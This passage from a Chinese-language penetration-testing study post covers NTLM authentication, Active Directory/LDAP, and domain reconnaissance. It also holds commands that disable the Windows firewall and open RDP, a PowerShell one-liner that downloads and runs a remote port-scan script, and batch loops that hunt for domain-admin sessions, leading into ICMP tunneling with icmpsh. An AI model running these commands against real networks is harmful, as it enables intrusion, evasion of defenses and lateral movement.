NTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成</li><li><strong>Windows本身不存储用户的明文密码</strong>，它会将用户的明文密码经过加密算法后存储在SAM数据库中</li><li>当用户登录的时候，将用户输入的明文密码也加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较</li></ul><p>LM Hash是windows早期用的加密算法，为了解决LM加密和身份验证中的固有的安全弱点，有了NTLM协议，从Windows7 和 windows server 2008开始，系统默认只会存储NTLM Hash。</p><p>NTLM Hash的产生过程</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804094211071.png" alt="image-20210804094211071"></p><p>本地认证流程</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804095544847.png" alt="image-20210804095544847"></p><p>NTLM协议包括了NTLMv1和NTLMv2两个版本，NTLM验证是一种Challenge/Reaponse 验证机制，由三种消息组成：</p><ol><li>协商：确认双方版本</li><li>质询：是Challenge / Response 认证机制起作用的范畴</li><li>验证：完成质询后，验证结果</li></ol><p>质询流程：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804103007109.png" alt="image-20210804103007109"></p><ol><li>客户端向服务器端发送用户信息（用户名）请求</li><li>服务器接搜到请求，判断本地账户列表中是否有对应的而用户名，如果有就生成一个Challenge，使用登录用户名对应的NTLM Hash加密Challenge，生成一个<strong>Net-NTLM Hash存在于内存</strong>中，生成后将Challenge发送给客户端（NTLMv1的Challenge是8位，NTLMv2的Challenge是16位）</li><li>客户端接搜到Challenge后使用将要扽牢固到账户对应的NTLM Hash加密Challenge生成Reaponse，然后将Response发送到服务端</li></ol><p>验证：服务端收到客户端的Response后对比Net-NTLM Hash 和Response是否相同。</p><p>相关漏洞：Hash传递攻击（PTH）</p><p>参考文章</p><p><a href="https://www.cnblogs.com/-qing-/p/11343859.html">https://www.cnblogs.com/-qing-/p/11343859.html</a></p><p><a href="https://websec.readthedocs.io/zh/latest/auth/ntlm.html">https://websec.readthedocs.io/zh/latest/auth/ntlm.html</a></p><h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p>Active Directory（活动目录）</p><ol><li><p>概念</p><ul><li><p>Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。它使用了一种结构化的数据存储方法，并且以此为基础对目录信息进行呵护逻辑的分层组织。</p><blockquote><p>网络对象：用户，用户组，计算机，域，组织单位以及安全策略等</p></blockquote></li></ul></li><li><p>活动目录的功能</p><ul><li>服务器以及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略</li><li>用户服务：管理用户域账户，用户信息，企业通讯录，用户组管理，用户身份认证，用户授权管理等</li><li>资源管理：管理打印机，文件共享服务等网络资源</li><li>桌面配置：系统管理员可以集中的配置各种桌面配置策略</li><li>应用系统支撑</li></ul></li></ol><p><a href="https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/">https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/</a></p><p><a href="https://zhuanlan.zhihu.com/p/147768058">https://zhuanlan.zhihu.com/p/147768058</a></p><p>LDAP（轻量目录访问协议）：约定了Client与Server之间的信息交互格式，使用端口号，认证方式等内容。微软的<code>Active Directory</code>就是依靠LDAP实现的，AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。<code>OpenLDAP</code> 是可以运行在 Linux 上的 LDAP 协议的开源实现。平常说的 LDAP Server，一般指的是安装并配置了 <code>Active Directory</code>、<code>OpenLDAP</code> 这些程序的服务器。</p><p>LDAP 的目录树概念:</p><ol><li><p>目录树：在一个目录服务系统中，整个目录信息集可以表示为一个目录信息树，树中的每个节点是 一个条目。</p></li><li><p>条目：每个条目就是一条记录，每个条目有自己的唯一可区别的名称(DN)。</p></li><li><p>对象类：objectClass，与某个实体类型对应的一组属性，对象类是可以继承的，这样父类的必须属</p><p>性也会被继承下来。</p></li><li><p>属性：描述条目的某个方面的信息，一个属性由一个属性类型和一个或多个属性值组成，属性有必须属性和非必须属性。</p></li></ol><h4 id="工作组-域信息收集"><a href="#工作组-域信息收集" class="headerlink" title="工作组/域信息收集"></a>工作组/域信息收集</h4><h5 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs routeros">whoami <span class="hljs-built_in">/user </span>查看当前用户<br>whoami /priv 查看当前用户权限<br>ipconfig /all 查看网络配置<br>nestat -ano  查看端口列表<br>systeminfo 查看系统信息<br>net share 查看本机共享<br>cmdkey /l 远程桌面连接历史记录<br>net<span class="hljs-built_in"> user </span>查看本机上的用户列表<br>net<span class="hljs-built_in"> user </span>name 查看本机用户具体信息<br>net localgroup administrators 获取本地管理员（通常包含域用户）信息<br>query<span class="hljs-built_in"> user </span>|| qwinsta 查看当前在线用户<br>route <span class="hljs-builtin-name">print</span> 查看路由表缓存<br>arp -a 路由缓存<br><br>wmic OS <span class="hljs-builtin-name">get</span> Caption,CSDVersion,OSArchitecture,Version 查看操作系统（基本systeminfo里面都有）<br>wmic product <span class="hljs-builtin-name">get</span> name,version 查看当前安装的程序<br>wmic<span class="hljs-built_in"> service </span>list brief 查询本机服务信息<br>wmic process list brief 查询进程列表<br>tasklist /v 查询进程列表<br>wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct <span class="hljs-builtin-name">Get</span> displayName /Format:list 查杀软<br><br>防火墙相关：<br>关闭防火墙：<br>windows<span class="hljs-built_in"> server </span>2003及以前：netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">set</span> opmode disable<br>windows<span class="hljs-built_in"> server </span>2003以后：netsh advfirewall <span class="hljs-builtin-name">set</span> allprofiles state off<br>查看防火墙配置：netsh<span class="hljs-built_in"> firewall </span>show config<br>修改防火墙配置：<br>windows<span class="hljs-built_in"> server </span>2003及以前允许指定程序全部连接：netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> allowedprogram c:\nc.exe <span class="hljs-string">&quot;allow nc&quot;</span> enable<br>windows<span class="hljs-built_in"> server </span>2003以后版本：<br>允许指定程序接入：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;pass nc&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;C:\nc.exe&quot;</span><br>允许指定程序退出：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Allow nc&quot;</span> <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=<span class="hljs-string">&quot;c:\nc.exe&quot;</span><br>允许3389端口开放：netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br>自定义防火墙日志的存储位置：netsh advfirewall <span class="hljs-builtin-name">set</span> currentprofile<span class="hljs-built_in"> logging </span>filename <span class="hljs-string">&quot;c:\windows\temp\fw.log&quot;</span><br><br>查看代理：reg query <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><br>查看远程服务连接端口：REG QUERY <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /V PortNumber<br><br>Windows<span class="hljs-built_in"> Server </span>2003中开启3389：wmic path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) <br>call setallowtsconnections 1<br><br>windows<span class="hljs-built_in"> Server </span>2008和2012中开启3389：<br>1. wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS!=<span class="hljs-string">&quot;&quot;</span>) call setallowtsconnections 1<br>2. wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (<span class="hljs-attribute">TerminialNAme</span>=<span class="hljs-string">&#x27;RDP-Tcp&#x27;</span>) call setuserauthenticationrequired 1<br>3. reg <span class="hljs-builtin-name">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot;</span> /v fSingleSessionPerUSer /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><h5 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h5><blockquote><p>工作组的信息收集感觉和上面差不多，平时没怎么遇到过</p></blockquote><h5 id="域"><a href="#域" class="headerlink" title="域"></a>域</h5><p>当内网中存在域，那么<strong>本地的普通用户</strong>只能查询到<strong>本机的相关信息</strong>不能查询到域内信息，本地管理员用户和域内用户可以查询域内信息。原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个<strong>查询需要权限</strong>认证，所以只有域用户才拥有这个权限；域用户执行查询命令时，会自动使用kerberos协议认证，无需输入额外的账户密码。</p><p>本地管理员Administrator权限可以直接提升为Ntauthority或者system权限，在域中除了普通用户以外，所有机器都有一个机器用户（用户名是机器名加上$），本质上<strong>机器的system用户对应的就是域内的机器用户</strong>，所以使用system权限可以运行域内的查询命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros">判断是否有域：<br>systeminfo<br>ipconfig /all 查看网关IP，DNS的IP，域名，本机是否和DNS服务器处于同一网段，然后使用nslookup解析域名的IP，判断域控和DNS是否在同一服务器<br><br>whoami /all  获取域SID<br>net<span class="hljs-built_in"> config </span>workstation 查看当前登录域<br>net time /domain 判断主域（域服务器通常作为时间服务器使用）<br><br>net<span class="hljs-built_in"> user </span>/domain 获得所有域用户列表<br>net<span class="hljs-built_in"> user </span>xxx /domain 查询指定用户详细信息<br>wmic useraccount <span class="hljs-builtin-name">get</span> /all 获取域内用户详细信息<br>dsquery<span class="hljs-built_in"> user </span>查看存在的用户<br><br>net view /domain 查询域<br>net view /domain:domain_name 查询域内所有计算机<br><br>net<span class="hljs-built_in"> group </span>/domain 获得所有域用户组列表<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain computers&quot;</span> /domain 查询域成员计算机<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Controllers&quot;</span> /domain 查看域控制器组（一个域内一般存在两台或者两台以上的域控制器，防灾）<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain 获得域管理员列表<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Enterprise Admins&quot;</span> /domain 查询管理员用户组<br>net localgroup administrators 获取本地管理员（通常包含域用户）信息<br><br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br><br>nltest /DCLIST:domain_name 查看域控机器名<br>netdom query pdc 查看域控机器名<br>Nslookup <span class="hljs-attribute">-type</span>=SRV _ldap._tcp 查看域控制器主机名<br><br>tasklist /v 列出本机进程和进程用户（需要注意是否有域管理员的进程）<br></code></pre></td></tr></table></figure><p><strong>探测域内存活主机</strong></p><ol><li><code>nbtscan</code>：下载：<a href="http://unixwiz.net/tools/nbtscan.html">http://unixwiz.net/tools/nbtscan.html</a> 传入靶机执行<code>nbt.exe ip段</code> 即可</li><li>利用ICMP协议探测：<code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></li><li>ARP扫描内网：windows版 <a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a> 其他版本<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a> </li><li>Empire中的arpscan模块，输入<code>unamemodule situational_awareness/network/arpscan</code></li><li>使用Nishang中的Invoke-ARPScan.ps1脚本</li><li>使用TCP、UDP端口扫描探测内网，ScanLine工具（使用体验不是很好）</li></ol><p><strong>扫描域内端口</strong></p><p>工具下载：<a href="https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">https://pan.wgpsec.org/public/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B</a></p><ol><li><p>利用telnet命令扫描</p></li><li><p>s扫描器</p></li><li><p>MSF端口扫描</p></li><li><p>powershell的Invoke-portscan.ps1脚本，推荐使用无文件形式扫描</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs latex">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:<span class="hljs-tag">\<span class="hljs-name">windows</span></span><span class="hljs-tag">\<span class="hljs-name">temp</span></span><span class="hljs-tag">\<span class="hljs-name">res</span></span>.txt&quot;<br></code></pre></td></tr></table></figure></li><li><p>Nishang的Invoke-PortScan模块</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Invoke-PortScan -StartAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.1</span> -EndAddress <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.255</span> -ResolveHost<br></code></pre></td></tr></table></figure></li><li><p>如果发现了端口，可以使用客户端连接工具或者nc获取服务端的Banner信息（需要注意一些平时的特定端口）</p></li></ol><p><strong>域管理员定位</strong></p><p>当计算机加入域后会默认给域管理员赋予本地系统管理员权限，域管理员组的成员均可访问本地计算机，并且具备完全的控制权限。在域网络攻击测试中，获取域内的一个支点后，需要获取域管理员的权限。</p><p>假设现在在Windows域中取得了普通用户权限，希望在域中横向移动，需要找到域内用户的登录位置，他是否是任何系统的本地管理员，他所属的组，他是否有单访问文件共享等。枚举主机，用户和组，有助于更好的了解域的布局。</p><ol><li><p><code>psloggedon.exe</code> 可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户（某些功能需要管理员权限）</p><p>下载：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p></li><li><p><code>PVEFindADUser.exe</code> 用于查找活动目录用户登录的位置，枚举域用户，以及在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计划任务的用户。（运行需要管理员权限）</p><p>下载：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p></li><li><p><code>netview.exe</code>枚举工具，使用了WinAPI枚举系统，利用NetSessionEnum找寻登录会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录用户。能够查询共享入口和有价值的用户，大部分功能不需要管理员权限</p><p>下载：<a href="https://github.com/mubix/netview/releases">https://github.com/mubix/netview/releases</a></p></li><li><p><code>Nmap</code>的NSE脚本</p><ul><li><code>smb—enum-domains.nse</code>：对域控进行信息收集，可以获取主机信息，用户，可使用密码策略的用户</li><li><code>smb—enum-users.nse</code>：渗透测试时如果获取到域内某台主机的权限，但是权限有限无法获取更多的域用户信息时，可以使用这个脚本来对域控制器进行扫描</li><li><code>smb—enum-shares.nse</code>：遍历远程主机的共享目录</li><li><code>smb—enum-processes.nse</code>：对主机系统进程遍历，从而知道目标主机运行了哪些软件</li><li><code>smb—enum-sessions.nse</code>：获取域内主机的用户登录会话，查看当前是否有用户登录</li><li><code>smb—enum-discovery.nse</code>：收集目标主机的信息（操作系统，计算机名，域名…………）</li></ul><p>脚本下载链接：<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p></li><li><p><code>PowerView</code>脚本，它是<code>powershell</code>的脚本，提供了辅助定位关键用户的功能</p><p>下载：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs groovy">Get-<span class="hljs-attr">NetDomain:</span> 获取当前用户所在域的名称 <br>Get-<span class="hljs-attr">NetUser:</span> 获取所有用户的详细信息 <br>Get-<span class="hljs-attr">NetDomainController:</span> 获取所有域控制器的信息 <br>Get-<span class="hljs-attr">NetComputer:</span> 获取域内所有机器的详细信息 <br>Get-<span class="hljs-attr">NetOU:</span> 获取域中的OU信息 <br>Get-<span class="hljs-attr">NetGroup:</span> 获取所有域内组和组成员信息 <br>Get-<span class="hljs-attr">NetFileServer:</span> 根据SPN获取当前域使用的文件服务器信息 <br>Get-<span class="hljs-attr">NetShare:</span> 获取当前域内所有网络共享信息 <br>Get-<span class="hljs-attr">NetSession:</span> 获取指定服务器的会话 <br>Get-<span class="hljs-attr">NetRDPSession:</span> 获取指定服务器的远程连接 <br>Get-<span class="hljs-attr">NetProcess:</span> 获取远程主机的进程 <br>Get-<span class="hljs-attr">UserEvent:</span> 获取指定用户的日志 <br>Get-<span class="hljs-attr">ADObiect:</span> 获取活动目录的对象 <br>Get-<span class="hljs-attr">NetGPO:</span> 获取域内所有的组策略对象 <br>Get-<span class="hljs-attr">DomainPolicy:</span> 获取域默认策略或域控制器策略 <br>Invoke-<span class="hljs-attr">UserHunter:</span> 获取域用户登录的计算机信息及该用户是否有本地管理员权限 <br>Invoke-<span class="hljs-attr">ProcessHunter:</span> 通过查询域内所有的机器进程找到特定用户 <br>Invoke-<span class="hljs-attr">UserEvenHunter:</span> 根据用户日志查询某域用户登录过哪些域机器。<br></code></pre></td></tr></table></figure></li><li><p>Empire的user_hunter模块</p></li></ol><p><strong>查找域管理进程</strong></p><p>假设：在某个内网环境中获得了一个域普通用户的权限，然后提权<strong>获得了当前服务器的本地管理员权限</strong>，然后分析当前服务器的用户登录列表以及会话信息，知道了哪些用户登录了这台服务器，但是最后发现可以获取权限的登录用户<strong>都不是域管理账户，</strong>同时<strong>没有域管理员组中的用户登录这台服务器</strong>，就可以使用另一个账户并<strong>寻找该账户在内网哪台机器上具有权限</strong>，<strong>再枚举这台机器上的登录用户</strong>，然后继续渗透测试知道获得域管理员权限为止。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain admins&quot;</span> /domain 收集域管理员列表<br>tasklist /v 查询进程和进程所属用户（注意管理员用户）<br>net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;domain controllers&quot;</span> /domain 查询域控制器列表<br></code></pre></td></tr></table></figure><p>收集所有活动域的会话列表：使用netsess.exe ：<code>NetSess -h</code></p><p>交叉引用域管理员列表和活动会话列表：这样可以确定哪些IP地址具有活动域令牌，可以使用<code>netsess.exe</code>的windows命令行。将域控制器列表添加到dcs.txt 将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下，运行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">FOR /F <span class="hljs-symbol">%i</span> in (dcs.txt) do <span class="hljs-title">@echo</span> [+] Querying DC <span class="hljs-symbol">%i</span> &amp;&amp; <span class="hljs-title">@netsess</span> -h <span class="hljs-symbol">%i</span> <span class="hljs-number">2</span>&gt;<span class="hljs-keyword">null</span> &gt;sessions.txt &amp;&amp; FOR /F <span class="hljs-symbol">%a</span> in (admin.txt) DO <span class="hljs-title">@type</span> sessions.txt | <span class="hljs-title">@findstr</span> /I <span class="hljs-symbol">%a</span><br></code></pre></td></tr></table></figure><p>如果目标机器是在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理任务</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">FOR /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">DO</span> @echo [+] <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> @tasklist /V /S <span class="hljs-name">%i</span> /U user /P password 2&gt;<span class="hljs-meta">NULL</span> &gt; <span class="hljs-meta">output</span>.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (name.txt) <span class="hljs-meta">DO</span> @type <span class="hljs-meta">output</span>.txt | findstr <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found running a process <span class="hljs-meta">on</span> <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> pause<br>ips.txt 系统列表<br>names.txt 域管理员列表<br></code></pre></td></tr></table></figure><p>某些版本的windows操作系统允许用户通过NetBIOS查询已经登录用户，可以运行下面这个命令行脚本扫描远程系统活跃中的管理员会话</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -A <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br>ips.txt 系统列表<br>names.txt 域管理员列表<br></code></pre></td></tr></table></figure><p>也可以使用<code>nbtscan</code>工具</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">for /F <span class="hljs-name">%i</span> <span class="hljs-meta">in</span> (ips.txt) <span class="hljs-meta">do</span> @echo [+] Checking <span class="hljs-name">%i</span> <span class="hljs-variable">&amp;&amp;</span> nbtstat -f <span class="hljs-name">%i</span> 2&gt;<span class="hljs-meta">NULL</span> &gt;nbsessions.txt <span class="hljs-variable">&amp;&amp;</span> FOR /F <span class="hljs-name">%n</span> <span class="hljs-meta">in</span> (admins.txt) <span class="hljs-meta">DO</span> @type nbsessions.txt | findstr /I <span class="hljs-name">%n</span> &gt; <span class="hljs-meta">NULL</span> <span class="hljs-variable">&amp;&amp;</span> echo [!] <span class="hljs-name">%n</span> was found logged <span class="hljs-meta">into</span> <span class="hljs-name">%i</span><br></code></pre></td></tr></table></figure><p><strong>域分析工具</strong>：<code>BloodHound</code></p><blockquote><p>以上提到的工具的具体使用需要结合实战靶场</p></blockquote><h4 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h4><p>一般的网络通信就是先在两台机器之间建立TCP连接，然后进行正常的数据通信。</p><p>隧道：一种绕过端口屏蔽的通信方法。防火墙两端的数据报通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包到达目的地时，将数据还原，并将还原的数据包发送到相应的服务器上。</p><p>常用的隧道</p><ul><li>网络层：IPV6隧道，ICMP隧道，GRE隧道</li><li>传输层：TCP隧道，UDP隧道，常规端口转发</li><li>应用层：ssh隧道，HTTP隧道，HTTPS隧道，DNS隧道</li></ul><h5 id="判断内网连通性"><a href="#判断内网连通性" class="headerlink" title="判断内网连通性"></a>判断内网连通性</h5><ol><li>ICMP协议：<code>ping</code></li><li>TCP协议：<code>netcat</code></li><li>HTTP协议：<code>curl</code></li><li>DNS协议：<code>nslookup</code>，<code>dig</code></li></ol><p>如果遇见流量不能直接流出，内网中有代理服务器时的判断方法</p><ol><li><p>查看内网中是否存在类似”proxy”名称的机器</p></li><li><p>查看IE浏览器的直接代理</p></li><li><p>更具pac文件的路径（本地路径或者远程路径），将其下载查看</p></li><li><p>利用curl工具确认</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">curl www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>  <span class="hljs-comment">//不通</span><br>curl -x proxy-ip:port www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-comment">//通</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h5><p>在网络层中最常用的隧道协议就是IPv6和ICMP</p><h6 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a><strong>IPv6隧道</strong></h6><p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术，工作原理过程：</p><ol><li>节点A向节点B发送IPv6报文，首先在节点A和节点B之间建立一个隧道</li><li>节点A将<strong>IPv6报文封装</strong>在以节点<strong>B的IPv4地址为目的地</strong>，以<strong>自己的IPv4地址为源地址</strong>的<strong>IPv4报文中发送</strong></li><li>这个报文和普通的IPv4报文一样，经过IPv4的转发到达节点B</li><li>节点B收到此报文后，解除IPv4封装，取出其中的IPv6报文</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210730095849745.png" alt="image-20210730095849745"></p><blockquote><p>即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。</p><p>配置隧道和自动隧道的主要区别：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才可行，为执行隧道功能的节点分配IP地址时，采用自动隧道方法就不需要进行配置；配置隧道的方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如DHCP，人工配置或者其他IPv4的配置机制</p></blockquote><p>支持IPv6的隧道工具有<code>socat</code>，<code>6tunnel</code>，<code>nt6unnel</code>等</p><h6 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a><strong>ICMP隧道</strong></h6><p>如果攻击者使用各类上层隧道（HTTP隧道，DNS隧道，常规正/反向端口转发等）的操作都失败了，可以使用ping命令尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙。</p><p>常见工具</p><ol><li><p><code>icmpsh</code>：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p>使用的注意事项：</p><ul><li>需要安装<code>python-impacket</code>类</li><li>需要关闭本地系统的ICMP应答，<code>sysctl -w 